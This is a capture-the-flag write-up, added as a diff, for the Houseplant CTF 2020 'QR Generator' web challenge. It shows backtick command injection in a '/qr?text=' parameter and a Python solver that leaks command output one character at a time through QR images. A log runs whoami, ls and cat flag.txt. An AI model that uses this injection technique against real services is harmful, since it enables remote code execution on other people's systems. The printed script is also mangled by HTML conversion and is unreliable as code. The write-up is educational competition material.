@@ -1,0 +1,157 @@
+<h1>Houseplant CTF 2020 – QR Generator</h1>
+
+<ul>
+<li><strong>Category:</strong> web</li>
+<li><strong>Points:</strong> 50</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>I was playing around with some stuff on my computer and found out that you can generate QR codes! I tried to make an online QR code generator, but it seems that's not working like it should be. Would you mind taking a look?</p>
+  
+  <p>http://challs.houseplant.riceteacatpanda.wtf:30004</p>
+  
+  <p>Dev: jammy</p>
+  
+  <p>Hint! For some reason, my website isn't too fond of backticks...</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>The hint suggests a RCE.</p>
+
+<p>Analyzing the HTML source code, an interesting comment can be found.</p>
+
+<p>```html
+<html></p>
+
+<p><head>
+  <title>QR Code Generator</title>
+  <link rel="stylesheet" href="/stylesheets/style.css">
+</head></p>
+
+<p><body>
+  <h1>QR Generator</h1>
+  <p>Generate your QR codes here!</p></p>
+
+<p><!-- TODO: Fix bug where the QR code only contains 1 character -->
+  <img src />
+  <input type="text" placeholder="Enter text here..." />
+  <script>
+    const input = document.querySelector('input');
+    const img = document.querySelector('img');</p>
+
+<pre><code>['onkeyup', 'onchange'].forEach(action =&gt; {
+  input[action] = () =&gt; {
+    img.src = '/qr?text=' + encodeURIComponent(input.value)
+  }
+})
+</code></pre>
+
+<p></script>
+</body>
+</html>
+```</p>
+
+<p>The endpoint of this QR code service is <code>http://challs.houseplant.riceteacatpanda.wtf:30004/qr</code>.</p>
+
+<p>The QR code produced contains <em>only the first char inserted</em>. Using backticks, you can confirm the RCE. For example, sending <code>echo 'X'</code> command will return the QR code of the letter <code>X</code>.</p>
+
+<p><code>
+http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text=`echo%20%27X%27`
+</code></p>
+
+<p><img src="qr-echo-X.png" alt="qr-echo-X.png" /></p>
+
+<p>You can write a <a href="qr-generator-solver.py">Python script</a> to exfiltrate output of executed commands.</p>
+
+<p>```python</p>
+
+<h1>!/usr/bin/python</h1>
+
+<p>import requests
+import sys
+import time
+import os
+import base64</p>
+
+<h1>pit3 install pillow</h1>
+
+<h1>pip3 install pyqrcode</h1>
+
+<h1>pip3 install pyzbar</h1>
+
+<p>from PIL import Image
+from pyzbar.pyzbar import decode</p>
+
+<p>target_url = "http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text={}"
+headers = {
+   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);",
+   "Accept-Encoding": "gzip, deflate",
+   "Referer": "http://challs.houseplant.riceteacatpanda.wtf:30004/",
+}</p>
+
+<p>def execute<em>command(command):
+    print("cmd &gt; {}".format(command))
+    command</em>output = ""
+    i = 1
+    finished = False
+    while not finished:
+        payload = "<code>{}|base64|cut -c{}</code>".format(command, i)
+        qr<em>code = http</em>get(payload)
+        qr<em>code</em>image<em>name = "qr.png"
+        with open(qr</em>code<em>image</em>name, "wb") as qr<em>code</em>image:
+            qr<em>code</em>image.write(qr<em>code)
+        qr</em>data = decode(Image.open(qr<em>code</em>image<em>name))[0].data.decode("utf-8")
+        if len(qr</em>data.strip()) &gt; 0:
+            command<em>output += qr</em>data
+        else:
+            finished = True
+        os.remove(qr<em>code</em>image<em>name)
+        i += 1
+    print(base64.b64decode(command</em>output))</p>
+
+<p>def http<em>get(payload):
+    response = None
+    response</em>ok = False
+    while not response<em>ok:
+        try:
+            target</em>attacked = target<em>url.format(payload)
+            r = requests.get(target</em>attacked, headers=headers)
+            response = r.content
+            if r.status<em>code == 200:
+                response</em>ok = True
+                time.sleep(1)
+            else:
+                print("   ERROR!")
+                time.sleep(10)
+            if "PNG" not in r.text:
+                raise Exception("PNG not found in response!")
+        except:
+            print("   EXCEPTION!")
+            time.sleep(5 * 60)
+    return response</p>
+
+<p>execute_command(sys.argv[1])
+```</p>
+
+<p>You can interact launching the remote commands.</p>
+
+<p><code>
+user@vm:~$ python3 -W ignore qr-generator-solver.py whoami
+cmd &gt; whoami
+b'rtcp\n'
+user@vm:~$ python3 -W ignore qr-generator-solver.py ls
+cmd &gt; ls
+b'README.md\napp\nflag.txt\nnode_modules\npackage.json\nstart.sh'
+user@vm:~$ python3 -W ignore qr-generator-solver.py "cat flag.txt"
+cmd &gt; cat flag.txt
+b'rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}\n'
+</code></p>
+
+<p>So the flag is the following.</p>
+
+<p><code>
+rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}
+</code></p>
